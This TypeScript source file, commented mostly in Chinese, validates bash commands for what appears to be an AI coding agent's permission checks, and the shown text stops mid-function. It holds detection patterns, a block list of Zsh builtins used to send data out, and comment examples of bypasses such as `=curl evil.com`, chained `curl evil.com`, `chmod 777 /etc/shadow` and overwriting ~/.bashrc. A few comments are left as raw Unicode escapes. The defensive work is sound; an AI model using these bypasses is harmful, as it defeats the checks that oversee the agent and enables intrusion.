import { logEvent } from 'src/services/analytics/index.js'
import { extractHeredocs } from 'src/utils/bash/heredoc.js'
import { ParsedCommand } from 'src/utils/bash/ParsedCommand.js'
import {
  hasMalformedTokens,
  hasShellQuoteSingleQuoteBug,
  tryParseShellCommand,
} from 'src/utils/bash/shellQuote.js'
import type { TreeSitterAnalysis } from 'src/utils/bash/treeSitterAnalysis.js'
import type { PermissionResult } from 'src/utils/permissions/PermissionResult.js'

const HEREDOC_IN_SUBSTITUTION = /\$\(.*<</

// 注意：反引号模式在 validateDangerousPatterns 中单独处理
// 以区分转义和未转义的反引号
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  // Zsh EQUALS 展开：词首的 =cmd 会展开为 $(which cmd)。
  // `=curl evil.com` → `/usr/bin/curl evil.com`，绕过 Bash(curl:*) deny
  // 规则，因为解析器把 `=curl` 视为基础命令，而不是 `curl`。
  // 只匹配位于词首且后跟命令名字符的 =（不匹配 VAR=val）。
  {
    pattern: /(?:^|[\s;&|])=[a-zA-Z_]/,
    message: 'Zsh equals expansion (=cmd)',
  },
  { pattern: /\$\(/, message: '$() command substitution' },
  // biome-ignore lint/suspicious/noTemplateCurlyInString: describing shell syntax, not a template literal
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
  { pattern: /\(e:/, message: 'Zsh-style glob qualifiers' },
  { pattern: /\(\+/, message: 'Zsh glob qualifier with command execution' },
  {
    pattern: /\}\s*always\s*\{/,
    message: 'Zsh always block (try/always construct)',
  },
  // 纵深防御：即使我们不在 PowerShell 中执行，也屏蔽 PowerShell 注释语法
  // 作为对未来可能引入 PowerShell 执行的变更的防护
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]

// Zsh 特有的危险命令，可绕过安全检查。
// 这些会针对每个命令段的基础命令（第一个词）进行检查。
const ZSH_DANGEROUS_COMMANDS = new Set([
  // zmodload 是许多基于模块的危险攻击的入口：
  // zsh/mapfile（通过数组赋值进行隐形文件 I/O），
  // zsh/system（sysopen/syswrite 两步式文件访问），
  // zsh/zpty（伪终端命令执行），
  // zsh/net/tcp（通过 ztcp 进行网络外泄），
  // zsh/files（内建 rm/mv/ln/chmod，绕过二进制检查）
  'zmodload',
  // 带 -c flag 的 emulate 是等价于 eval 的命令，会执行任意代码
  'emulate',
  // 启用危险操作的 Zsh 模块内建命令。
  // 这些命令需要先 zmodload，但我们作为纵深防御屏蔽它们，
  // 以防 zmodload 被绕过或模块已预加载。
  'sysopen', // 以细粒度控制打开文件（zsh/system）
  'sysread', // 从文件描述符读取（zsh/system）
  'syswrite', // 向文件描述符写入（zsh/system）
  'sysseek', // 对文件描述符进行寻址（zsh/system）
  'zpty', // 在伪终端上执行命令（zsh/zpty）
  'ztcp', // 创建用于外泄的 TCP 连接（zsh/net/tcp）
  'zsocket', // 创建 Unix/TCP 套接字（zsh/net/socket）
  'mapfile', // 实际上不是命令，但关联数组通过 zmodload 设置
  'zf_rm', // 来自 zsh/files 的内建 rm
  'zf_mv', // 来自 zsh/files 的内建 mv
  'zf_ln', // 来自 zsh/files 的内建 ln
  'zf_chmod', // 来自 zsh/files 的内建 chmod
  'zf_chown', // 来自 zsh/files 的内建 chown
  'zf_mkdir', // 来自 zsh/files 的内建 mkdir
  'zf_rmdir', // 来自 zsh/files 的内建 rmdir
  'zf_chgrp', // 来自 zsh/files 的内建 chgrp
])

// bash 安全检查的数字标识符（避免记录字符串）
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
  NETWORK_DEVICE_REDIRECT: 24,
} as const

type ValidationContext = {
  originalCommand: string
  baseCommand: string
  unquotedContent: string
  fullyUnquotedContent: string
  /** stripSafeRedirections 之前的 fullyUnquoted —— validateBraceExpansion 使用，
   * 以避免 redirection 剥离产生反斜杠相邻而导致的假阴性 */
  fullyUnquotedPreStrip: string
  /** 类似 fullyUnquotedPreStrip，但保留引号字符（'/"）：例如
   * echo 'x'# → echo ''#（引号字符保留，暴露与 # 的相邻关系） */
  unquotedKeepQuoteChars: string
  /** Tree-sitter 分析数据（如果可用）。验证器在存在时可使用它进行
   * 更精确的分析，否则回退到 regex。 */
  treeSitter?: TreeSitterAnalysis | null
}

type QuoteExtraction = {
  withDoubleQuotes: string
  fullyUnquoted: string
  /** 类似 fullyUnquoted，但保留引号字符（'/"）：剥离被引用的内容但保留
   * 分隔符。validateMidWordHash 用它检测引号相邻的 #
   * （例如 'x'#，若剥离引号会隐藏相邻关系）。 */
  unquotedKeepQuoteChars: string
}

function extractQuotedContent(command: string, isJq = false): QuoteExtraction {
  let withDoubleQuotes = ''
  let fullyUnquoted = ''
  let unquotedKeepQuoteChars = ''
  let inSingleQuote = false
  let inDoubleQuote = false
  let escaped = false

  for (let i = 0; i < command.length; i++) {
    const char = command[i]

    if (escaped) {
      escaped = false
      if (!inSingleQuote) withDoubleQuotes += char
      if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
      if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
      continue
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true
      if (!inSingleQuote) withDoubleQuotes += char
      if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
      if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
      continue
    }

    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote
      unquotedKeepQuoteChars += char
      continue
    }

    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote
      unquotedKeepQuoteChars += char
      // 对于 jq，在提取中包含引号以确保内容被正确分析
      if (!isJq) continue
    }

    if (!inSingleQuote) withDoubleQuotes += char
    if (!inSingleQuote && !inDoubleQuote) fullyUnquoted += char
    if (!inSingleQuote && !inDoubleQuote) unquotedKeepQuoteChars += char
  }

  return { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars }
}

function stripSafeRedirections(content: string): string {
  // 安全性：三个模式都必须有尾部边界 (?=\s|$)。
  // 否则，`> /dev/nullo` 会把 `/dev/null` 作为 PREFIX 匹配，剥离
  // `> /dev/null` 留下 `o`，于是 `echo hi > /dev/nullo` 变成 `echo hi o`。
  // validateRedirections 随后看不到 `>` 就放行。对 /dev/nullo 的文件写入
  // 会通过只读路径（checkReadOnlyConstraints）自动允许。
  // 主 bashPermissions 流程受保护（checkPathConstraints 校验原始命令），
  // 但 speculation.ts 单独使用 checkReadOnlyConstraints。
  return content
    .replace(/\s+2\s*>&\s*1(?=\s|$)/g, '')
    .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, '')
    .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, '')
}

/**
 * 检查内容是否包含单个字符的未转义出现。
 * 正确处理 bash 转义序列，其中反斜杠转义其后跟随的字符。
 *
 * 重要：此函数只处理单个字符，不处理字符串。如果需要扩展
 * 以处理多字符字符串，务必格外小心 shell 的 ANSI-C 引用
 * (e.g., $'\n', $'\x41', $'\u0041') which can encode arbitrary characters and strings in ways
 * 它们可以以极难正确解析的方式
 * 编码任意字符和字符串。错误处理可能引入安全漏洞，
 * 使攻击者能够绕过安全检查。
 *
 * @param content - 要搜索的字符串（通常来自 extractQuotedContent）
 * @param char - 要搜索的单个字符（例如 '`'）
 * @returns 如果找到未转义的出现则返回 true，否则返回 false
 *
 * 示例：
 *   hasUnescapedChar("test \`safe\`", '`') → false（转义的反引号）
 *   hasUnescapedChar("test `dangerous`", '`') → true（未转义的反引号）
 *   hasUnescapedChar("test\\`date`", '`') → true（转义的反斜杠 + 未转义的反引号）
 */
function hasUnescapedChar(content: string, char: string): boolean {
  if (char.length !== 1) {
    throw new Error('hasUnescapedChar only works with single characters')
  }

  let i = 0
  while (i < content.length) {
    // 如果看到反斜杠，跳过它和下一个字符（它们组成一个转义序列）
    if (content[i] === '\\' && i + 1 < content.length) {
      i += 2 // 跳过反斜杠和被转义的字符
      continue
    }

    // 检查当前字符是否匹配
    if (content[i] === char) {
      return true // 找到未转义的出现
    }

    i++
  }

  return false // 未找到未转义的出现
}

function validateEmpty(context: ValidationContext): PermissionResult {
  if (!context.originalCommand.trim()) {
    return {
      behavior: 'allow',
      updatedInput: { command: context.originalCommand },
      decisionReason: { type: 'other', reason: 'Empty command is safe' },
    }
  }
  return { behavior: 'passthrough', message: 'Command is not empty' }
}

function validateIncompleteCommands(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context
  const trimmed = originalCommand.trim()

  if (/^\s*\t/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message: 'Command appears to be an incomplete fragment (starts with tab)',
    }
  }

  if (trimmed.startsWith('-')) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 2,
    })
    return {
      behavior: 'ask',
      message:
        'Command appears to be an incomplete fragment (starts with flags)',
    }
  }

  if (/^\s*(&&|\|\||;|>>?|<)/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.INCOMPLETE_COMMANDS,
      subId: 3,
    })
    return {
      behavior: 'ask',
      message:
        'Command appears to be a continuation line (starts with operator)',
    }
  }

  return { behavior: 'passthrough', message: 'Command appears complete' }
}

/**
 * 检查命令是否是可绕过通用 $() 验证器的“安全” heredoc-in-substitution 模式。
 *
 * 这是一个 EARLY-ALLOW 路径：返回 `true` 会导致 bashCommandIsSafe
 * 返回 `passthrough`，绕过所有后续验证器。鉴于此权限，
 * 该检查必须是可证明安全的，而不是“大概安全”。
 *
 * 我们只允许以下模式：
 *   [prefix] $(cat <<'DELIM'\n
 *   [body lines]\n
 *   DELIM\n
 *   ) [suffix]
 *
 * 其中：
 * - 分隔符必须单引号引用（'DELIM'）或转义（\DELIM），这样
 *   body 是字面文本，不做展开
 * - 结束分隔符必须单独占一行（或者对于 $(cat <<'EOF'\n...\nEOF)` 内联形式，
 *   只允许尾部空白 + `)`）
 * - 结束分隔符必须是第一个这样的行 —— 精确匹配 bash 的行为
 *   （不会跳过早期分隔符去查找 EOF））
 * - 在 $( 之前必须有非空白文本（即替换用于参数位置，
 *   而不是命令名）。否则 heredoc body 会成为任意命令名，[suffix] 作为参数。
 * - 剥离 heredoc 后的剩余文本必须通过所有验证器
 *
 * 此实现使用基于行的匹配，而非 regex [\s\S]*?，
 * 以精确复刻 bash 的 heredoc 关闭行为。
 */
function isSafeHeredoc(command: string): boolean {
  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return false

  // 安全性：在 << 和分隔符之间使用 [ \t]（而非 \s）。\s 会匹配
  // 换行符，但 bash 要求分隔符词与 << 在同一行。
  // 跨换行匹配可能接受 bash 会拒绝的畸形语法。
  // 处理引号变体：'EOF'、''EOF''（splitCommand 可能破坏引号）。
  const heredocPattern =
    /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
  let match
  type HeredocMatch = {
    start: number
    operatorEnd: number
    delimiter: string
    isDash: boolean
  }
  const safeHeredocs: HeredocMatch[] = []

  while ((match = heredocPattern.exec(command)) !== null) {
    const delimiter = match[2] || match[3]
    if (delimiter) {
      safeHeredocs.push({
        start: match.index,
        operatorEnd: match.index + match[0].length,
        delimiter,
        isDash: match[1] === '-',
      })
    }
  }

  // 如果未找到安全 heredoc 模式，则不安全
  if (safeHeredocs.length === 0) return false

  // 安全性：对每个 heredoc，使用基于行的匹配查找结束分隔符，
  // 该匹配精确复刻 bash 的行为。bash 在第一个与分隔符完全匹配的行
  // 关闭 heredoc。分隔符的任何后续出现都只是内容（或新命令）。Regex
  // [\s\S]*? 可能跳过第一个分隔符去查找稍后的 `DELIM)`
  // 模式，从而隐藏两个分隔符之间注入的命令。
  type VerifiedHeredoc = { start: number; end: number }
  const verified: VerifiedHeredoc[] = []

  for (const { start, operatorEnd, delimiter, isDash } of safeHeredocs) {
    // 起始行必须在分隔符后立即结束（换行前只允许水平空白）。
    // 如果有其他内容（如 `; rm -rf /`），则不是简单的安全 heredoc。
    const afterOperator = command.slice(operatorEnd)
    const openLineEnd = afterOperator.indexOf('\n')
    if (openLineEnd === -1) return false // 完全没有内容
    const openLineTail = afterOperator.slice(0, openLineEnd)
    if (!/^[ \t]*$/.test(openLineTail)) return false // 起始行有额外内容

    // body 从换行后开始
    const bodyStart = operatorEnd + openLineEnd + 1
    const body = command.slice(bodyStart)
    const bodyLines = body.split('\n')

    // 查找第一行关闭 heredoc 的行。有两种有效形式：
    //   1. `DELIM` 单独占一行（bash 标准），下一行是 `)`
    //      （之前只允许空白）
    //   2. `DELIM)` 在同一行（内联 $(cat <<'EOF'\n...\nEOF) 形式，
    //      bash 的 PST_EOFTOKEN 同时关闭 heredoc 和替换）
    // 对于 <<-，匹配前会剥离前导制表符。
    let closingLineIdx = -1
    let closeParenLineIdx = -1 // `)` 所在的行索引
    let closeParenColIdx = -1 // 该行上 `)` 的列索引

    for (let i = 0; i < bodyLines.length; i++) {
      const rawLine = bodyLines[i]!
      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine

      // 形式 1：分隔符单独占一行
      if (line === delimiter) {
        closingLineIdx = i
        // `)` 必须在下一行，且之前只允许空白
        const nextLine = bodyLines[i + 1]
        if (nextLine === undefined) return false // 没有结束 `)`
        const parenMatch = nextLine.match(/^([ \t]*)\)/)
        if (!parenMatch) return false // `)` 不在下一行开头
        closeParenLineIdx = i + 1
        closeParenColIdx = parenMatch[1]!.length // `)` 的位置
        break
      }

      // 形式 2：分隔符紧跟 `)`（PST_EOFTOKEN 形式）
      // 分隔符和 `)` 之间只允许空白。
      if (line.startsWith(delimiter)) {
        const afterDelim = line.slice(delimiter.length)
        const parenMatch = afterDelim.match(/^([ \t]*)\)/)
        if (parenMatch) {
          closingLineIdx = i
          closeParenLineIdx = i
          // 列号在 rawLine 中（剥离制表符前），所以重新计算
          const tabPrefix = isDash ? (rawLine.match(/^\t*/)?.[0] ?? '') : ''
          closeParenColIdx =
            tabPrefix.length + delimiter.length + parenMatch[1]!.length
          break
        }
        // 行以分隔符开头但有其他尾部内容 ——
        // 这不是结束行（bash 要求精确匹配或 EOF`)`）。
        // 但这也是危险信号：如果这在 $() 内，bash 可能通过
        // PST_EOFTOKEN 与其他 shell 元字符提前关闭。
        // 我们已在 extractHeredocs 中处理该情况 —— 这里只是
        // 拒绝它，因为不匹配我们的安全模式。
        if (/^[)}`|&;(<>]/.test(afterDelim)) {
          return false // 模糊的提前关闭模式
        }
      }
    }

    if (closingLineIdx === -1) return false // 未找到结束分隔符

    // 计算绝对结束位置（`)` 字符之后一位）
    let endPos = bodyStart
    for (let i = 0; i < closeParenLineIdx; i++) {
      endPos += bodyLines[i]!.length + 1 // +1 对应换行符
    }
    endPos += closeParenColIdx + 1 // +1 以包含 `)` 本身

    verified.push({ start, end: endPos })
  }

  // 安全性：拒绝嵌套匹配。regex 在原始文本中查找 $(cat <<'X' 模式，
  // 不理解 quoted-heredoc 语义。当外层 heredoc 有引号分隔符（<<'A'）时，
  // 其 body 在 bash 中是字面文本 —— 任何内部 $(cat <<'B' 只是字符，
  // 不是真正的 heredoc。但我们的 regex 同时匹配两者，产生嵌套范围。
  // 剥离嵌套范围会破坏索引：剥离内部范围后，外部范围的 `end` 过期
  // （指向缩短后字符串之后），导致 `remaining.slice(end)` 返回 ''
  // 并静默丢弃任何后缀（例如 `; rm -rf /`）。由于我们所有匹配的 heredoc
  // 都有引号/转义分隔符，body 内的嵌套匹配始终是字面文本 ——
  // 没有合法用户会写这种模式。退回到安全回退。
  for (const outer of verified) {
    for (const inner of verified) {
      if (inner === outer) continue
      if (inner.start > outer.start && inner.start < outer.end) {
        return false
      }
    }
  }

  // 从命令中剥离所有已验证的 heredoc，构建 `remaining`。
  // 按倒序处理以保持早期索引有效。
  const sortedVerified = [...verified].sort((a, b) => b.start - a.start)
  let remaining = command
  for (const { start, end } of sortedVerified) {
    remaining = remaining.slice(0, start) + remaining.slice(end)
  }

  // 安全性：如果（已剥离的）heredoc 位置之后有非空白文本，
  // 则剩余文本不得仅以空白开头。
  // 如果 $() 处于命令名位置（无 prefix），其输出会成为要执行的命令，
  // 任何后缀文本作为参数：
  //   $(cat <<'EOF'\nchmod\nEOF\n) 777 /etc/shadow
  //   → 运行 `chmod 777 /etc/shadow`
  // 我们只允许替换处于参数位置：$( 之前必须有命令词。
  // 剥离后，`remaining` 应类似 `cmd args... [more args]`。
  // 如果 remaining 仅以空白开头（或为空），则 $() 就是命令 ——
  // 只有在没有尾随参数时才安全。
  const trimmedRemaining = remaining.trim()
  if (trimmedRemaining.length > 0) {
    // 有 prefix 命令 —— 很好。但验证原始命令在第一个 $( 之前
    // 也有非空白 prefix（heredoc 可能有多个；我们需要第一个的 prefix）。
    const firstHeredocStart = Math.min(...verified.map(v => v.start))
    const prefix = command.slice(0, firstHeredocStart)
    if (prefix.trim().length === 0) {
      // $() 处于命令名位置但有尾随文本 —— 不安全。
      // heredoc body 成为命令名，尾随文本成为参数。
      return false
    }
  }

  // 检查剩余文本只包含安全字符。
  // 剥离安全 heredoc 后，剩余文本应只是命令名、参数、引号和空白。
  // 拒绝任何 shell 元字符，以防止操作符（|、&、&&、||、;）或展开
  // （$、`、{、<、>）用于在安全 heredoc 之后链接危险命令。
  // 安全性：只使用显式 ASCII 空格/制表符 —— \s 会匹配 unicode 空白
  // \u5982 \u00A0\uFF0C\u53EF\u7528\u4E8E\u9690\u85CF\u5185\u5BB9\u3002\u6362\u884C\u7B26\u4E5F\u88AB\u5C4F\u853D
  // \uFF08\u5B83\u4EEC\u8868\u793A heredoc body \u4E4B\u5916\u7684\u591A\u884C\u547D\u4EE4\uFF09\u3002
  if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(remaining)) return false

  // 安全性：剩余文本（剥离 heredoc 后的命令）也必须
  // 通过所有安全验证器。否则，将安全 heredoc 追加到危险命令
  // （例如 `zmodload zsh/system $(cat <<'EOF'\nx\nEOF\n)`）
  // 会导致此提前允许路径返回 passthrough，绕过
  // validateZshDangerousCommands、validateProcEnvironAccess 以及任何其他
  // 检查 allowlist 安全字符模式的主验证器。
  // 无递归风险：`remaining` 没有 `$(... <<` 模式，所以递归
  // 调用的 validateSafeCommandSubstitution 会立即返回 passthrough。
  if (bashCommandIsSafe_DEPRECATED(remaining).behavior !== 'passthrough')
    return false

  return true
}

/**
 * 检测格式良好的 $(cat <<'DELIM'...DELIM) heredoc 替换模式。
 * 返回剥离匹配 heredoc 后的命令，如果未找到则返回 null。
 * 供 pre-split gate 使用，以剥离安全 heredoc 并重新检查剩余部分。
 */
export function stripSafeHeredocSubstitutions(command: string): string | null {
  if (!HEREDOC_IN_SUBSTITUTION.test(command)) return null

  const heredocPattern =
    /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
  let result = command
  let found = false
  let match
  const ranges: Array<{ start: number; end: number }> = []
  while ((match = heredocPattern.exec(command)) !== null) {
    if (match.index > 0 && command[match.index - 1] === '\\') continue
    const delimiter = match[2] || match[3]
    if (!delimiter) continue
    const isDash = match[1] === '-'
    const operatorEnd = match.index + match[0].length

    const afterOperator = command.slice(operatorEnd)
    const openLineEnd = afterOperator.indexOf('\n')
    if (openLineEnd === -1) continue
    if (!/^[ \t]*$/.test(afterOperator.slice(0, openLineEnd))) continue

    const bodyStart = operatorEnd + openLineEnd + 1
    const bodyLines = command.slice(bodyStart).split('\n')
    for (let i = 0; i < bodyLines.length; i++) {
      const rawLine = bodyLines[i]!
      const line = isDash ? rawLine.replace(/^\t*/, '') : rawLine
      if (line.startsWith(delimiter)) {
        const after = line.slice(delimiter.length)
        let closePos = -1
        if (/^[ \t]*\)/.test(after)) {
          const lineStart =
            bodyStart +
            bodyLines.slice(0, i).join('\n').length +
            (i > 0 ? 1 : 0)
          closePos = command.indexOf(')', lineStart)
        } else if (after === '') {
          const nextLine = bodyLines[i + 1]
          if (nextLine !== undefined && /^[ \t]*\)/.test(nextLine)) {
            const nextLineStart =
              bodyStart + bodyLines.slice(0, i + 1).join('\n').length + 1
            closePos = command.indexOf(')', nextLineStart)
          }
        }
        if (closePos !== -1) {
          ranges.push({ start: match.index, end: closePos + 1 })
          found = true
        }
        break
      }
    }
  }
  if (!found) return null
  for (let i = ranges.length - 1; i >= 0; i--) {
    const r = ranges[i]!
    result = result.slice(0, r.start) + result.slice(r.end)
  }
  return result
}

/** 仅检测：命令是否包含安全 heredoc 替换？ */
export function hasSafeHeredocSubstitution(command: string): boolean {
  return stripSafeHeredocSubstitutions(command) !== null
}

function validateSafeCommandSubstitution(
  context: ValidationContext,
): PermissionResult {
  const { originalCommand } = context

  if (!HEREDOC_IN_SUBSTITUTION.test(originalCommand)) {
    return { behavior: 'passthrough', message: 'No heredoc in substitution' }
  }

  if (isSafeHeredoc(originalCommand)) {
    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason:
          'Safe command substitution: cat with quoted/escaped heredoc delimiter',
      },
    }
  }

  return {
    behavior: 'passthrough',
    message: 'Command substitution needs validation',
  }
}

function validateGitCommit(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'git' || !/^git\s+commit\s+/.test(originalCommand)) {
    return { behavior: 'passthrough', message: 'Not a git commit' }
  }

  // 安全性：反斜杠会导致我们的 regex 错误识别引号边界
  // （例如 `git commit -m "test\"msg" && evil`）。合法的提交消息
  // 几乎从不包含反斜杠，所以退回到完整验证器链。
  if (originalCommand.includes('\\')) {
    return {
      behavior: 'passthrough',
      message: 'Git commit contains backslash, needs full validation',
    }
  }

  // 安全性：`-m` 之前的 `.*?` 不得匹配 shell 操作符。此前
  // `.*?` 匹配除 `\n` 外的任何字符，包括 `;`、`&`、`|`、`` ` ``、`$(`。
  // 对于 `git commit ; curl evil.com -m 'x'`，`.*?` 吞掉了 `; curl evil.com `
  // 留下 remainder=``（falsy → 跳过 remainder 检查）→ 对复合命令
  // 返回 `allow`。提前允许会跳过所有主验证器（约第 1908 行），
  // 使 validateQuotedNewline、validateBackslashEscapedOperators 等失效。
  // 虽然 splitCommand 目前在下游捕获此情况，但提前允许是
  // 对完整命令安全的正面断言 —— 而它并不安全。
  //
  // 另外：`git` 和 `commit` 之间的 `\s+` 不得匹配 `\n`/`\r`
  // （bash 中的命令分隔符）。使用 `[ \t]+` 仅匹配水平空白。
  //
  // `[^;&|`$<>()\n\r]*?` 字符类排除 shell 元字符。我们在这里
  // 也排除 `<` 和 `>`（redirect）—— 它们在 REMAINDER 中是允许的
  // （用于 `--author="Name <email>"`），但不得出现在 `-m` 之前。
  const messageMatch = originalCommand.match(
    /^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/,
  )

  if (messageMatch) {
    const [, quote, messageContent, remainder] = messageMatch

    if (quote === '"' && messageContent && /\$\(|`|\$\{/.test(messageContent)) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.GIT_COMMIT_SUBSTITUTION,
        subId: 1,
      })
      return {
        behavior: 'ask',
        message: 'Git commit message contains command substitution patterns',
      }
    }

    // 安全性：检查 remainder 中的 shell 操作符，它们可能链接命令
    // 或重定向输出。regex 中 `-m` 之前的 `.*` 会吞掉 flags
    // 如 `--amend`，在 remainder 中留下 `&& evil` 或 `> ~/.bashrc`。
    // 此前我们只检查 $() / `` / ${}，遗漏了操作符
    // 如 ; | & && || < >。
    //
    // `<` 和 `>` 可以合法地出现在引号内的 --author 值中
    // 如 `--author="Name <email>"`。未引用的 `>` 是 shell redirect
    // 操作符。由于 validateGitCommit 是 EARLY 验证器，在此返回
    // `allow` 会短路 bashCommandIsSafe 并跳过
    // validateRedirections。所以我们必须对未引用的 `<>` 退回到 passthrough，
    // 让主验证器处理。
    //
    // 攻击：`git commit --allow-empty -m 'payload' > ~/.bashrc`
    //   validateGitCommit 返回 allow → bashCommandIsSafe 短路 →
    //   validateRedirections 从不运行 → ~/.bashrc 被包含 `payload` 的 git
    //   stdout 覆盖 → 下次 shell 登录时 RCE。
    if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
      return {
        behavior: 'passthrough',
        message: 'Git commit remainder contains shell metacharacters',
      }
    }
    if (remainder) {
      // 剥离引号内容，然后检查 `<` 或 `>`。引号内的 `<>`（--author 中的
      // email 尖括号）是安全的；未引用的 `<>` 是 shell redirect。
      // 注意：这个简单的引号跟踪器不处理反斜杠。引号外的 `\'`/`\"`
      // 会使它失步（bash：\' = 字面 '，跟踪器：切换
      // SQ）。但第 584 行已对 originalCommand 中的任何反斜杠退出，
      // 所以不会带反斜杠到达这里。对于无反斜杠输入，
      // 简单的引号切换是正确的（没有 \\ 就无法转义引号）。
      let unquoted = ''
      let inSQ = false
      let inDQ = false
      for (let i = 0; i < remainder.length; i++) {
        const c = remainder[i]
        if (c === "'" && !inDQ) {
          inSQ = !inSQ
          continue
        }
        if (c === '"' && !inSQ) {
          inDQ = !inDQ
          continue
        }
        if (!inSQ && !inDQ) unquoted += c
      }
      if (/[<>]/.test(unquoted)) {
        return {
          behavior: 'passthrough',
          message: 'Git commit remainder contains unquoted redirect operator',
        }
      }
    }

    // 安全加固：屏蔽以 dash 开头的消息
    // 这可捕获潜在的混淆模式，如 git commit -m "---"
    if (messageContent && messageContent.startsWith('-')) {
      logEvent('tengu_bash_security_check_triggered', {
        checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
        subId: 5,
      })
      return {
        behavior: 'ask',
        message: 'Command contains quoted characters in flag names',
      }
    }

    return {
      behavior: 'allow',
      updatedInput: { command: originalCommand },
      decisionReason: {
        type: 'other',
        reason: 'Git commit with simple quoted message is allowed',
      },
    }
  }

  return { behavior: 'passthrough', message: 'Git commit needs validation' }
}

function validateJqCommand(context: ValidationContext): PermissionResult {
  const { originalCommand, baseCommand } = context

  if (baseCommand !== 'jq') {
    return { behavior: 'passthrough', message: 'Not jq' }
  }

  if (/\bsystem\s*\(/.test(originalCommand)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_SYSTEM_FUNCTION,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'jq command contains system() function which executes arbitrary commands',
    }
  }

  // 文件参数现已允许 —— 它们将由 readOnlyValidation.ts 中的路径验证进行校验
  // 只屏蔽可能将文件读入 jq 变量的危险 flags
  const afterJq = originalCommand.substring(3).trim()
  if (
    /(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(
      afterJq,
    )
  ) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.JQ_FILE_ARGUMENTS,
      subId: 1,
    })
    return {
      behavior: 'ask',
      message:
        'jq command contains dangerous flags that could execute code or read arbitrary files',
    }
  }

  return { behavior: 'passthrough', message: 'jq command is safe' }
}

function validateShellMetacharacters(
  context: ValidationContext,
): PermissionResult {
  const { unquotedContent } = context
  const message =
    'Command contains shell metacharacters (;, |, or &) in arguments'

  if (/(?:^|\s)["'][^"']*[;&][^"']*["'](?:\s|$)/.test(unquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 1,
    })
    return { behavior: 'ask', message }
  }

  const globPatterns = [
    /-name\s+["'][^"']*[;|&][^"']*["']/,
    /-path\s+["'][^"']*[;|&][^"']*["']/,
    /-iname\s+["'][^"']*[;|&][^"']*["']/,
  ]

  if (globPatterns.some(p => p.test(unquotedContent))) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 2,
    })
    return { behavior: 'ask', message }
  }

  if (/-regex\s+["'][^"']*[;&][^"']*["']/.test(unquotedContent)) {
    logEvent('tengu_bash_security_check_triggered', {
      checkId: BASH_SECURITY_CHECK_IDS.SHELL_METACHARACTERS,
      subId: 3,
    })
    return { behavior: 'ask', message }
  }

  return { behavior: 'passthrough', message: 'No metacharacters' }
}

function validateDangerousVariables(
  context: ValidationContext,
): PermissionResult {
  const { fullyUnquotedContent } = context

  if (
